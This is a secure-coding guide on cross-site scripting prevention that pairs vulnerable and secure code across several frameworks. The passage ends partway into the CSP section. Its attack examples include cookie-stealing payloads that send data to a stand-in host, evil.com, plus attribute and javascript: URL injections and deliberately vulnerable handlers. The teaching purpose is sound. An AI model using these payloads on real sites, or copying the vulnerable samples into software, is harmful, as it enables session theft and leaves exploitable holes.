# XSS Prevention

> **Domain:** Security > Web Application Security > XSS Prevention
> **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
> **OWASP:** A03:2021 Injection
> **Difficulty:** Intermediate to Advanced
> **Last Updated:** 2026-03-10

## Why It Matters

Cross-Site Scripting (XSS) is the most prevalent web application vulnerability class. An XSS flaw allows an attacker to inject malicious scripts into web pages viewed by other users. The victim's browser executes the attacker's script because it cannot distinguish between legitimate application code and injected content. The consequence is severe: session hijacking, credential theft, keylogging, phishing overlays, cryptocurrency mining, malware distribution, and full account takeover.

XSS persists because web applications routinely take user-controlled data and insert it into HTML documents, JavaScript code, URL parameters, CSS properties, and DOM structures without proper encoding. The fundamental defense is context-sensitive output encoding: every piece of untrusted data must be encoded for the specific context in which it is rendered. There is no single "sanitize" function that works in all contexts.

This guide covers every XSS type, context-specific defenses, framework-level protections, Content Security Policy, HTML sanitization, advanced attack variants (DOM clobbering, mutation XSS), and XSS in non-HTML contexts.

---

## Table of Contents

1. [Reflected XSS](#1-reflected-xss)
2. [Stored XSS](#2-stored-xss)
3. [DOM-Based XSS](#3-dom-based-xss)
4. [Context-Sensitive Output Encoding](#4-context-sensitive-output-encoding)
5. [Framework Auto-Escaping](#5-framework-auto-escaping)
6. [Content Security Policy as XSS Defense Layer](#6-content-security-policy-as-xss-defense-layer)
7. [HTML Sanitization](#7-html-sanitization)
8. [DOM Clobbering](#8-dom-clobbering)
9. [Mutation XSS (mXSS)](#9-mutation-xss-mxss)
10. [XSS in Different Contexts](#10-xss-in-different-contexts)
11. [Best Practices](#best-practices)
12. [Anti-Patterns](#anti-patterns)
13. [Enforcement Checklist](#enforcement-checklist)

---

## 1. Reflected XSS

**What it is:** The attacker crafts a malicious URL containing a script payload in a query parameter, fragment, or path segment. The server includes this parameter in the HTML response without encoding. The victim clicks the link, and the browser executes the payload in the context of the vulnerable application's origin.

**Attack flow:** Attacker crafts URL -> Victim clicks link -> Server reflects input into HTML -> Browser executes script -> Attacker receives stolen data.

**Impact:** Session hijacking via cookie theft, credential harvesting, phishing overlays, CSRF token extraction, redirects to malicious sites.

### Attack Anatomy

```
Legitimate request:
  GET /search?q=javascript+tutorial HTTP/1.1
  Response: <p>Results for: javascript tutorial</p>

Malicious request:
  GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

  Response: <p>Results for: <script>document.location='https://evil.com/steal?c='+document.cookie</script></p>
  -- Browser executes the script, sends cookies to attacker

URL-encoded payload (how it actually appears in a phishing link):
  https://vulnerable.com/search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fevil.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E

Attribute injection:
  GET /search?q=" onfocus="alert(1)" autofocus="
  Response: <input type="text" value="" onfocus="alert(1)" autofocus="">
  -- The injected event handler fires automatically

SVG-based bypass:
  GET /search?q=<svg onload="alert(document.domain)">
  -- SVG elements support event handlers
```

### Vulnerable Code

```typescript
// VULNERABLE: Directly interpolating query parameter into HTML response
import express from "express";

const app = express();

app.get("/search", (req, res) => {
  const query = req.query.q as string;
  // NEVER DO THIS -- user input is reflected directly into HTML
  res.send(`
    <h1>Search Results</h1>
    <p>You searched for: ${query}</p>
    <input type="text" value="${query}" />
  `);
});
```

```python
# VULNERABLE: Jinja2 with autoescape disabled
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/search")
def search():
    query = request.args.get("q", "")
    # NEVER DO THIS -- autoescape is disabled, input is rendered as raw HTML
    template = "<p>Results for: {{ query }}</p>"
    return render_template_string(template, query=query)
```

```go
// VULNERABLE: Using text/template instead of html/template
package main

import (
    "net/http"
    "text/template"  // WRONG -- text/template does NOT escape HTML
)

func searchHandler(w http.ResponseWriter, r *http.Request) {
    query := r.URL.Query().Get("q")
    // NEVER DO THIS -- text/template performs no HTML encoding
    tmpl := template.Must(template.New("search").Parse(
        `<p>Results for: {{.Query}}</p>`,
    ))
    tmpl.Execute(w, map[string]string{"Query": query})
}
```

### Secure Code

```typescript
// SECURE: HTML-encode all user input before insertion into HTML
import express from "express";
import escapeHtml from "escape-html";

const app = express();

app.get("/search", (req, res) => {
  const query = req.query.q as string || "";
  const safeQuery = escapeHtml(query);
  res.send(`
    <h1>Search Results</h1>
    <p>You searched for: ${safeQuery}</p>
    <input type="text" value="${safeQuery}" />
  `);
});
```

```python
# SECURE: Jinja2 with autoescape enabled (Flask default for .html templates)
from flask import Flask, request, render_template_string
from markupsafe import escape

app = Flask(__name__)

@app.route("/search")
def search():
    query = request.args.get("q", "")
    # Option 1: Manual escaping
    safe_query = escape(query)
    # Option 2: Jinja2 autoescape (default in Flask for .html templates)
    # {{ query }} in a .html template auto-escapes
    return render_template_string(
        "<p>Results for: {{ query }}</p>",
        query=query  # Jinja2 auto-escapes when autoescape=True
    )
```

```go
// SECURE: Use html/template -- it auto-escapes for HTML context
package main

import (
    "html/template"  // CORRECT -- html/template escapes output contextually
    "net/http"
)

func searchHandler(w http.ResponseWriter, r *http.Request) {
    query := r.URL.Query().Get("q")
    tmpl := template.Must(template.New("search").Parse(
        `<p>Results for: {{.Query}}</p>`,
    ))
    // html/template encodes < > & " ' in HTML context automatically
    tmpl.Execute(w, map[string]string{"Query": query})
}
```

```java
// SECURE: Use OWASP Java Encoder for context-specific encoding
import org.owasp.encoder.Encode;
import javax.servlet.http.*;

public class SearchServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws Exception {
        String query = req.getParameter("q");
        resp.setContentType("text/html; charset=UTF-8");
        resp.getWriter().write(
            "<p>Results for: " + Encode.forHtml(query) + "</p>" +
            "<input type=\"text\" value=\"" + Encode.forHtmlAttribute(query) + "\" />"
        );
    }
}
```

---

## 2. Stored XSS

**What it is:** The attacker submits a malicious payload that is persisted in the application's database (comments, user profiles, messages, forum posts, product descriptions). When other users view the page containing this stored data, the payload executes in their browsers.

**Attack flow:** Attacker submits payload -> Application stores it in database -> Victim requests page -> Server retrieves payload from database and includes it in HTML -> Browser executes script.

**Impact:** All reflected XSS impacts, but at scale. Every user who views the page is compromised. Worm-like propagation is possible (Samy worm, 2005). Stored XSS is more dangerous than reflected XSS because it does not require the victim to click a specially crafted link.

### Attack Anatomy

```
Step 1: Attacker submits a comment
  POST /api/comments
  Body: { "text": "Great article! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>" }

Step 2: Application stores the comment in the database
  INSERT INTO comments (text) VALUES ('Great article! <script>fetch(...)...</script>');

Step 3: Victim views the page
  GET /article/123
  Response includes:
    <div class="comment">
      Great article! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
    </div>
  -- Browser executes the script for every visitor

Profile-based stored XSS:
  Display name: "<img src=x onerror='new Image().src=\"https://evil.com/steal?\"+document.cookie'>"
  -- Every page showing this user's name triggers the payload

Markdown-based stored XSS:
  User submits: [Click me](javascript:alert(document.cookie))
  Rendered as: <a href="javascript:alert(document.cookie)">Click me</a>
  -- If the markdown renderer does not filter javascript: URLs
```

### Vulnerable Code

```typescript
// VULNERABLE: Rendering user-generated content without encoding
import express from "express";
import { pool } from "./db";

const app = express();

app.get("/article/:id", async (req, res) => {
  const article = await pool.query("SELECT * FROM articles WHERE id = $1", [req.params.id]);
  const comments = await pool.query("SELECT * FROM comments WHERE article_id = $1", [req.params.id]);

  // NEVER DO THIS -- database content is inserted into HTML without encoding
  let html = `<h1>${article.rows[0].title}</h1>`;
  for (const comment of comments.rows) {
    html += `<div class="comment">${comment.text}</div>`;  // XSS: stored payload executes
  }
  res.send(html);
});
```

```php
<?php
// VULNERABLE: Echoing database content without htmlspecialchars
$stmt = $pdo->query("SELECT * FROM comments WHERE article_id = " . intval($articleId));
$comments = $stmt->fetchAll();

foreach ($comments as $comment) {
    // NEVER DO THIS -- stored payloads execute when the page is rendered
    echo "<div class='comment'>" . $comment['text'] . "</div>";
}
?>
```

### Secure Code

```typescript
// SECURE: Encode all output, validate and sanitize input
import express from "express";
import escapeHtml from "escape-html";
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";
import { pool } from "./db";

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);

const app = express();

// Defense layer 1: Sanitize on INPUT (if rich HTML is required)
app.post("/api/comments", async (req, res) => {
  const rawText = req.body.text;

  // If plain text only: strip all HTML
  const plainText = escapeHtml(rawText);

  // If rich HTML is required: sanitize with allowlist
  const sanitizedHtml = DOMPurify.sanitize(rawText, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li"],
    ALLOWED_ATTR: ["href"],
    ALLOW_DATA_ATTR: false,
  });

  await pool.query("INSERT INTO comments (article_id, text) VALUES ($1, $2)", [
    req.body.articleId,
    plainText, // or sanitizedHtml if rich text is needed
  ]);
  res.status(201).json({ success: true });
});

// Defense layer 2: Encode on OUTPUT
app.get("/article/:id", async (req, res) => {
  const comments = await pool.query(
    "SELECT * FROM comments WHERE article_id = $1",
    [req.params.id]
  );

  let html = "";
  for (const comment of comments.rows) {
    // If stored as plain text: HTML-encode on output
    html += `<div class="comment">${escapeHtml(comment.text)}</div>`;
  }
  res.send(html);
});
```

```php
<?php
// SECURE: Always use htmlspecialchars with ENT_QUOTES and UTF-8
$stmt = $pdo->prepare("SELECT * FROM comments WHERE article_id = ?");
$stmt->execute([$articleId]);
$comments = $stmt->fetchAll();

foreach ($comments as $comment) {
    // htmlspecialchars encodes < > & " ' for HTML context
    echo "<div class='comment'>"
       . htmlspecialchars($comment['text'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')
       . "</div>";
}
?>
```

```csharp
// SECURE: ASP.NET Razor auto-encodes by default
// In Razor views (.cshtml), @Model.Comment is automatically HTML-encoded
// NEVER use @Html.Raw(Model.Comment) with user-generated content

// For manual encoding in C# code:
using System.Web;
using System.Text.Encodings.Web;

public string RenderComment(string commentText)
{
    // HtmlEncoder.Default encodes for HTML body context
    return $"<div class=\"comment\">{HtmlEncoder.Default.Encode(commentText)}</div>";
}
```

---

## 3. DOM-Based XSS

**What it is:** The vulnerability exists entirely in client-side JavaScript. The application reads data from an attacker-controllable source (URL fragment, URL parameters, document.referrer, postMessage, Web Storage) and passes it to a dangerous sink (innerHTML, document.write, eval, setTimeout with string argument, location assignment). The malicious payload never reaches the server.

**Attack flow:** Attacker crafts URL with payload in fragment or parameter -> Victim opens URL -> Client-side JavaScript reads the source and writes it to a sink -> Browser executes the payload.

**Key concept -- Sources and Sinks:**
- **Sources** (attacker-controlled data): `location.hash`, `location.search`, `location.href`, `document.referrer`, `document.URL`, `window.name`, `postMessage` data, `localStorage`, `sessionStorage`, URL fragment identifiers.
- **Sinks** (dangerous execution points): `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`, `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function(string)`, `element.setAttribute("onclick", ...)`, `element.src`, `element.href`, `location.assign()`, `location.replace()`, `jQuery.html()`, `$.append()`, `$.after()`, `$.before()`, `v-html`, `dangerouslySetInnerHTML`.

### Attack Anatomy

```
Application JavaScript:
  // Reads from URL hash and inserts into DOM
  document.getElementById("welcome").innerHTML = "Hello, " + location.hash.substring(1);

Legitimate URL:
  https://app.com/dashboard#Alice
  Result: <div id="welcome">Hello, Alice</div>

Malicious URL:
  https://app.com/dashboard#<img src=x onerror=alert(document.cookie)>
  Result: <div id="welcome">Hello, <img src=x onerror=alert(document.cookie)></div>
  -- Browser parses the img tag, triggers onerror, executes JavaScript

Another common pattern -- eval with URL data:
  const config = location.hash.substring(1);
  eval("var settings = " + config);  // Arbitrary code execution

postMessage-based DOM XSS:
  // Application listens for messages
  window.addEventListener("message", (e) => {
    // No origin check, directly inserts into DOM
    document.getElementById("notification").innerHTML = e.data.message;
  });
  // Attacker opens the page in an iframe and sends:
  targetWindow.postMessage({ message: "<img src=x onerror=alert(1)>" }, "*");
```

### Vulnerable Code

```typescript
// VULNERABLE: Multiple DOM XSS sinks
function initPage(): void {
  // Sink 1: innerHTML with URL fragment
  const username = decodeURIComponent(location.hash.substring(1));
  document.getElementById("greeting")!.innerHTML = `Welcome, ${username}!`;

  // Sink 2: document.write with URL parameter
  const params = new URLSearchParams(location.search);
  const theme = params.get("theme");
  document.write(`<link rel="stylesheet" href="/themes/${theme}.css">`);

  // Sink 3: eval with URL data
  const config = params.get("config");
  if (config) {
    eval(config);  // Arbitrary code execution
  }

  // Sink 4: setTimeout with string argument
  const action = params.get("action");
  if (action) {
    setTimeout("doAction('" + action + "')", 1000);
  }

  // Sink 5: jQuery .html() with untrusted data
  const message = params.get("msg");
  $("#notification").html(message!);

  // Sink 6: Unvalidated postMessage handler
  window.addEventListener("message", (event) => {
    // No origin validation
    document.getElementById("updates")!.innerHTML = event.data;
  });
}
```

### Secure Code

```typescript
// SECURE: Use safe DOM APIs and validate all sources
function initPage(): void {
  // SAFE: Use textContent instead of innerHTML
  const username = decodeURIComponent(location.hash.substring(1));
  const greetingEl = document.getElementById("greeting");
  if (greetingEl) {
    greetingEl.textContent = `Welcome, ${username}!`;  // textContent does not parse HTML
  }

  // SAFE: Validate against allowlist before constructing URLs
  const params = new URLSearchParams(location.search);
  const theme = params.get("theme");
  const ALLOWED_THEMES = new Set(["light", "dark", "high-contrast"]);
  if (theme && ALLOWED_THEMES.has(theme)) {
    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.href = `/themes/${encodeURIComponent(theme)}.css`;
    document.head.appendChild(link);
  }

  // SAFE: Never use eval. Parse JSON if structured data is needed.
  const config = params.get("config");
  if (config) {
    try {
      const parsed = JSON.parse(config);  // JSON.parse is safe -- it cannot execute code
      applyConfig(parsed);
    } catch {
      console.error("Invalid config parameter");
    }
  }

  // SAFE: Use function reference instead of string in setTimeout
  const action = params.get("action");
  const ALLOWED_ACTIONS = new Map<string, () => void>([
    ["refresh", () => doAction("refresh")],
    ["logout", () => doAction("logout")],
  ]);
  if (action && ALLOWED_ACTIONS.has(action)) {
    setTimeout(ALLOWED_ACTIONS.get(action)!, 1000);
  }

  // SAFE: Use textContent or DOM APIs instead of jQuery .html()
  const message = params.get("msg");
  const notifEl = document.getElementById("notification");
  if (message && notifEl) {
    notifEl.textContent = message;  // Safe: no HTML parsing
  }

  // SAFE: Validate postMessage origin
  window.addEventListener("message", (event) => {
    // Step 1: Validate origin
    if (event.origin !== "https://trusted-domain.com") {
      return;  // Reject messages from unknown origins
    }
    // Step 2: Validate data structure
    if (typeof event.data !== "string") {
      return;
    }
    // Step 3: Use textContent, not innerHTML
    const updatesEl = document.getElementById("updates");
    if (updatesEl) {
      updatesEl.textContent = event.data;
    }
  });
}
```

### DOM XSS Prevention Rules

1. **Never use `innerHTML`, `outerHTML`, or `document.write()` with untrusted data.** Use `textContent` or `createElement` + `appendChild`.
2. **Never use `eval()`, `new Function()`, `setTimeout(string)`, or `setInterval(string)`.** Use function references instead of strings.
3. **Validate `postMessage` origin.** Always check `event.origin` against an allowlist of expected origins.
4. **Treat all URL components as untrusted input.** `location.hash`, `location.search`, `location.href`, `document.referrer`, and `window.name` are all attacker-controlled.
5. **Use `setAttribute()` carefully.** Never set event handler attributes (`onclick`, `onerror`, `onload`) with untrusted data. Use `addEventListener()` instead.

---

## 4. Context-Sensitive Output Encoding

**The fundamental principle:** There is no universal "sanitize" or "escape" function. Data must be encoded specifically for the context in which it is inserted. The same data requires different encoding in an HTML body, an HTML attribute, a JavaScript string, a URL parameter, and a CSS value.

### 4.1 HTML Body Context

Characters that must be encoded: `<`, `>`, `&`, `"`, `'`.

```
Context:    <p>USER_DATA_HERE</p>
Encoding:   < -> &lt;   > -> &gt;   & -> &amp;   " -> &quot;   ' -> &#x27;
```

```typescript
// TypeScript/JavaScript -- HTML body encoding
function encodeForHtml(input: string): string {
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

// Or use a library: escape-html, he, lodash.escape
import escapeHtml from "escape-html";
const safe = escapeHtml(userInput);
```

```go
// Go -- html/template auto-encodes for HTML context
// For manual encoding:
import "html"

safe := html.EscapeString(userInput)
```

```python
# Python -- markupsafe (used by Jinja2/Flask)
from markupsafe import escape

safe = escape(user_input)
# Or: html.escape(user_input) from the standard library
```

```java
// Java -- OWASP Java Encoder
import org.owasp.encoder.Encode;

String safe = Encode.forHtml(userInput);
```

```php
// PHP -- htmlspecialchars
$safe = htmlspecialchars($userInput, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
```

```csharp
// C# -- HtmlEncoder
using System.Text.Encodings.Web;

string safe = HtmlEncoder.Default.Encode(userInput);
```

### 4.2 HTML Attribute Context

When inserting data into HTML attributes, always quote the attribute value and encode for the attribute context. Unquoted attributes can be broken out of with spaces.

```
DANGEROUS (unquoted):  <input value=USER_DATA_HERE>
  Payload: x onfocus=alert(1) autofocus
  Result:  <input value=x onfocus=alert(1) autofocus>

SAFE (quoted + encoded):  <input value="ENCODED_DATA">
  Payload: x" onfocus="alert(1)" autofocus="
  Encoded: x&quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;
  Result:  <input value="x&quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;">
  -- The payload is rendered as text, not as HTML attributes
```

```typescript
// TypeScript -- HTML attribute encoding
// For most attributes, HTML entity encoding is sufficient
// But NEVER insert untrusted data into event handler attributes (onclick, onload, etc.)
function encodeForHtmlAttribute(input: string): string {
  return input
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}
```

```java
// Java -- OWASP Java Encoder for attribute context
String safe = Encode.forHtmlAttribute(userInput);
// For unquoted attributes (avoid these, but if required):
String safe = Encode.forHtmlUnquotedAttribute(userInput);
```

**Critical rule:** Never insert untrusted data into event handler attributes (`onclick`, `onerror`, `onload`, `onmouseover`, etc.), `style` attributes, or `href`/`src` attributes with `javascript:` URLs. HTML encoding does not protect in these contexts because the browser first decodes HTML entities, then interprets the result as JavaScript or CSS.

### 4.3 JavaScript Context

When inserting data into JavaScript strings (inside `<script>` tags or event handlers), HTML encoding is not sufficient. The browser first processes the HTML, then passes the content to the JavaScript engine.

```
DANGEROUS:
  <script>var name = "USER_DATA_HERE";</script>
  Payload: ";alert(1)//
  Result:  <script>var name = "";alert(1)//";</script>

SAFE approach: Use JSON.stringify or JavaScript-specific encoding, NEVER embed in inline scripts.
```

```typescript
// TypeScript -- JavaScript string encoding
// The safest approach is to AVOID inline scripts entirely.
// Pass data from server to client via data attributes or JSON in a <script type="application/json"> tag.

// If inline scripts are absolutely necessary, use JSON.stringify:
function safelyEmbedInScript(data: unknown): string {
  // JSON.stringify encodes quotes and special characters
  // Then replace </ to prevent closing the script tag
  // Replace <!-- to prevent opening HTML comments
  return JSON.stringify(data)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/'/g, "\\u0027");
}

// PREFERRED: Use a data attribute or JSON island
// Server renders:
// <div id="config" data-user-name="HTML_ENCODED_VALUE"></div>
// Client reads:
// const name = document.getElementById("config").dataset.userName;
```

```java
// Java -- OWASP Java Encoder for JavaScript context
String safe = Encode.forJavaScript(userInput);
// This encodes characters that are special in JavaScript strings
```

### 4.4 URL Context

When inserting data into URL parameters or path segments, use URL encoding (percent-encoding). When inserting a full URL from user input (e.g., redirect targets), validate the scheme.

```
DANGEROUS:
  <a href="https://app.com/search?q=USER_DATA_HERE">
  Payload: " onclick="alert(1)
  Result:  <a href="https://app.com/search?q=" onclick="alert(1)">

DANGEROUS (javascript: scheme):
  <a href="USER_CONTROLLED_URL">
  Payload: javascript:alert(document.cookie)
  Result:  <a href="javascript:alert(document.cookie)">

SAFE: URL-encode parameters, validate scheme for full URLs
```

```typescript
// TypeScript -- URL parameter encoding
const safeParam = encodeURIComponent(userInput);
const url = `https://app.com/search?q=${safeParam}`;

// For full user-controlled URLs, validate the scheme:
function isUrlSafe(url: string): boolean {
  try {
    const parsed = new URL(url);
    return parsed.protocol === "https:" || parsed.protocol === "http:";
  } catch {
    return false;
  }
}

// NEVER allow javascript:, data:, vbscript:, or blob: schemes in href/src
function sanitizeHref(url: string): string {
  const ALLOWED_PROTOCOLS = ["https:", "http:", "mailto:"];
  try {
    const parsed = new URL(url, window.location.origin);
    if (!ALLOWED_PROTOCOLS.includes(parsed.protocol)) {
      return "#"; // Safe fallback
    }
    return url;
  } catch {
    // Relative URLs are generally safe
    if (url.startsWith("/") && !url.startsWith("//")) {
      return url;
    }
    return "#";
  }
}
```

```java
// Java -- URL encoding
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

String safeParam = URLEncoder.encode(userInput, StandardCharsets.UTF_8);
String url = "https://app.com/search?q=" + safeParam;

// OWASP Java Encoder for URL context
String safe = Encode.forUriComponent(userInput);
```

### 4.5 CSS Context

When inserting data into CSS properties (inline styles or `<style>` blocks), use CSS-specific encoding. CSS can execute JavaScript via `expression()` (older IE), `url()`, and certain property values.

```
DANGEROUS:
  <div style="background-color: USER_DATA_HERE;">
  Payload: red; background-image: url('javascript:alert(1)')
  Payload: expression(alert(document.cookie))  // IE only, but still a risk

SAFE: Validate against allowlist of CSS values
```

```typescript
// TypeScript -- CSS value encoding
// The safest approach: validate against an allowlist of known-safe values
const ALLOWED_COLORS = new Set([
  "red", "blue", "green", "black", "white", "#000", "#fff",
]);

function safeCssColor(input: string): string {
  if (ALLOWED_COLORS.has(input.toLowerCase())) {
    return input;
  }
  // Validate hex color format
  if (/^#[0-9a-fA-F]{3,6}$/.test(input)) {
    return input;
  }
  return "inherit"; // Safe fallback
}

// For CSS string values, encode non-alphanumeric characters as \HH
function encodeForCss(input: string): string {
  return input.replace(/[^a-zA-Z0-9]/g, (char) => {
    return "\\" + char.charCodeAt(0).toString(16).padStart(2, "0") + " ";
  });
}
```

```java
// Java -- OWASP Java Encoder for CSS context
String safe = Encode.forCssString(userInput);
String safeUrl = Encode.forCssUrl(userInput);
```

### 4.6 Context Encoding Summary

| Context | Example | Encoding Method | Danger If Wrong |
|---------|---------|----------------|-----------------|
| HTML body | `<p>DATA</p>` | HTML entity encode `< > & " '` | Script injection |
| HTML attribute | `<input value="DATA">` | HTML entity encode + always quote | Attribute injection |
| JavaScript string | `<script>var x="DATA"</script>` | JavaScript encode or JSON.stringify + replace `</` | Script breakout |
| URL parameter | `<a href="/search?q=DATA">` | `encodeURIComponent()` | Parameter injection |
| URL scheme | `<a href="DATA">` | Validate protocol allowlist (http, https, mailto) | `javascript:` execution |
| CSS value | `<div style="color:DATA">` | CSS encode or allowlist validation | Style injection, expression() |
| HTML comment | `<!-- DATA -->` | Do not insert untrusted data in comments | Comment breakout `-->` |

**Rule:** Never insert untrusted data into `<script>` tags, HTML comments (`<!-- -->`), attribute names, tag names, or directly into CSS. These contexts are too difficult to encode safely.

---

## 5. Framework Auto-Escaping

Modern frameworks provide automatic output encoding. Understand what each framework escapes by default, and where the escape hatches are.

### 5.1 React (JSX Auto-Escaping)

React escapes all values embedded in JSX by default. String values passed as children or attribute values are HTML-encoded before insertion into the DOM.

```tsx
// SAFE: React auto-escapes JSX expressions
function UserProfile({ name }: { name: string }) {
  // Even if name is "<script>alert(1)</script>", React renders it as text
  return <h1>Welcome, {name}</h1>;
}

// SAFE: Dynamic attributes are also escaped
function SearchInput({ query }: { query: string }) {
  return <input type="text" value={query} />;
}
```

```tsx
// DANGEROUS: dangerouslySetInnerHTML bypasses auto-escaping
function Comment({ html }: { html: string }) {
  // NEVER DO THIS with user-generated content
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// DANGEROUS: href with user-controlled URL
function Link({ url }: { url: string }) {
  // React does NOT validate URL schemes -- javascript: is allowed
  return <a href={url}>Click here</a>;  // XSS if url = "javascript:alert(1)"
}
```

```tsx
// SECURE: Sanitize before using dangerouslySetInnerHTML
import DOMPurify from "dompurify";

function RichComment({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li"],
    ALLOWED_ATTR: ["href", "target", "rel"],
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// SECURE: Validate URL scheme before using in href
function SafeLink({ url, children }: { url: string; children: React.ReactNode }) {
  const isValid = /^https?:\/\//i.test(url);
  return <a href={isValid ? url : "#"}>{children}</a>;
}
```

### 5.2 Vue.js (Template Auto-Escaping)

Vue templates auto-escape interpolations using double mustache syntax `{{ }}`. The `v-html` directive renders raw HTML.

```html
<!-- SAFE: Vue auto-escapes {{ }} expressions -->
<template>
  <p>Welcome, {{ userName }}</p>
  <!-- Even if userName is "<script>alert(1)</script>", it renders as text -->
</template>

<!-- DANGEROUS: v-html renders raw HTML -->
<template>
  <!-- NEVER DO THIS with user-generated content -->
  <div v-html="userComment"></div>
</template>

<!-- SECURE: Sanitize before using v-html -->
<script setup lang="ts">
import DOMPurify from "dompurify";
import { computed } from "vue";

const props = defineProps<{ rawHtml: string }>();
const sanitizedHtml = computed(() =>
  DOMPurify.sanitize(props.rawHtml, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "p", "br"],
    ALLOWED_ATTR: [],
  })
);
</script>

<template>
  <div v-html="sanitizedHtml"></div>
</template>
```

### 5.3 Angular (DomSanitizer)

Angular automatically sanitizes values bound to properties like `innerHTML`. It uses a built-in sanitizer that strips dangerous content. Bypassing the sanitizer requires explicit use of `DomSanitizer.bypassSecurityTrustHtml()`.

```typescript
// SAFE: Angular auto-sanitizes innerHTML bindings
@Component({
  template: `<div [innerHTML]="userContent"></div>`
})
export class CommentComponent {
  userContent = '<b>Bold text</b><script>alert(1)</script>';
  // Angular strips the <script> tag, keeps <b>Bold text</b>
}

// DANGEROUS: Bypassing Angular's sanitizer
import { DomSanitizer, SafeHtml } from "@angular/platform-browser";

@Component({
  template: `<div [innerHTML]="trustedContent"></div>`
})
export class UnsafeComponent {
  trustedContent: SafeHtml;

  constructor(private sanitizer: DomSanitizer) {
    // NEVER DO THIS with user-generated content
    this.trustedContent = sanitizer.bypassSecurityTrustHtml(userInput);
  }
}
```

### 5.4 Django Templates

Django templates auto-escape all variables by default. The `|safe` filter and `{% autoescape off %}` disable escaping.

```html
<!-- SAFE: Django auto-escapes {{ variable }} by default -->
<p>{{ user_input }}</p>
<!-- If user_input is "<script>alert(1)</script>", renders as: -->
<!-- <p>&lt;script&gt;alert(1)&lt;/script&gt;</p> -->

<!-- DANGEROUS: The |safe filter disables escaping -->
<p>{{ user_input|safe }}</p>
<!-- NEVER DO THIS with user-generated content -->

<!-- DANGEROUS: Disabling autoescape for a block -->
{% autoescape off %}
  <p>{{ user_input }}</p>  <!-- Not escaped -->
{% endautoescape %}

<!-- SECURE: Use the |escape filter explicitly when autoescape is off -->
{% autoescape off %}
  <p>{{ user_input|escape }}</p>
{% endautoescape %}
```

### 5.5 Go html/template vs text/template

Go's `html/template` package provides context-aware auto-escaping. It detects whether data is being inserted into HTML, JavaScript, URL, or CSS context and applies the appropriate encoding. Go's `text/template` provides NO escaping at all.

```go
// DANGEROUS: text/template has NO escaping
import "text/template"  // WRONG

tmpl := template.Must(template.New("page").Parse(`<p>{{.Name}}</p>`))
// If Name is "<script>alert(1)</script>", it is rendered as-is

// SECURE: html/template provides context-aware escaping
import "html/template"  // CORRECT

tmpl := template.Must(template.New("page").Parse(`
  <p>{{.Name}}</p>                           <!-- HTML-encoded -->
  <a href="/profile?name={{.Name}}">Profile</a>  <!-- URL-encoded in href -->
  <script>var name = "{{.Name}}";</script>   <!-- JavaScript-encoded -->
`))
// html/template detects the context and applies the correct encoding
```

### 5.6 Jinja2 (Python)

Jinja2 supports autoescape, but it is NOT enabled by default in standalone use. Flask enables it for `.html` templates by default.

```python
# DANGEROUS: Standalone Jinja2 with autoescape off (the default)
from jinja2 import Environment

env = Environment()  # autoescape is OFF by default
template = env.from_string("<p>{{ name }}</p>")
template.render(name="<script>alert(1)</script>")  # XSS

# SECURE: Enable autoescape
from jinja2 import Environment, select_autoescape

env = Environment(autoescape=select_autoescape(["html", "htm", "xml"]))
# Now {{ name }} is auto-escaped in .html templates

# DANGEROUS: The |safe filter in Jinja2
# {{ user_content|safe }}  -- disables escaping, same risk as Django
```

### Framework Auto-Escaping Summary

| Framework | Auto-Escape Default | Escape Hatch (DANGEROUS) |
|-----------|--------------------|-----------------------------|
| React | JSX expressions | `dangerouslySetInnerHTML`, `href` with `javascript:` |
| Vue | `{{ }}` interpolation | `v-html` directive |
| Angular | `[innerHTML]` binding (sanitized) | `DomSanitizer.bypassSecurityTrust*()` |
| Django | Template variables | `{{ var\|safe }}`, `{% autoescape off %}` |
| Go html/template | All template actions | Using `text/template` instead, `template.HTML()` type |
| Jinja2 | Off by default, on in Flask | `{{ var\|safe }}`, `Markup()` |
| ASP.NET Razor | `@variable` | `@Html.Raw()` |

**Rule:** Never use a framework's escape hatch with user-generated content unless the content has been sanitized with a proven HTML sanitization library.

---

## 6. Content Security Policy as XSS Defense Layer

Content Security Policy (CSP) is an HTTP response header that tells the browser which sources of content are permitted on a page. A strict CSP is the most effective defense-in-depth layer against XSS, because it blocks the execution of injected scripts even if output encoding fails.

### 6.1 Strict CSP with Nonces

The most effective CSP strategy uses nonces: a random, unguessable token generated for each response. Only `<script>` tags with the matching nonce execute.

```
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
```

```typescript
// TypeScript/Express -- Nonce-based CSP
import express from "express";
import crypto from "crypto";

const app = express();

app.use((req, res, next) => {
